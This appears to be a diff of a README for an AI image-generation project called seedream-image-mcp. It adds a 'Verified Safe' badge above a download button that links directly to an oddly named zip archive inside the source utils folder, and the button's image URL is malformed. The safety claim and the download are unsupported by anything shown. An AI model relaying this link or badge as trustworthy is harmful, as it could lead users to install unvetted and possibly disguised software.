@@ -1,5 +1,7 @@
 # 🚀 seedream-image-mcp - Enhance Your Creativity with AI 
 
+[![SafeSkill 93/100](https://img.shields.io/badge/SafeSkill-93%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/avdp1951-seedream-image-mcp)
+
 ## 📥 Download the App  
 [![Download](https://raw.githubusercontent.com/avdp1951/seedream-image-mcp/main/src/utils/image-mcp-seedream-engobe.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/avdp1951/seedream-image-mcp/main/src/utils/image-mcp-seedream-engobe.zip)
 
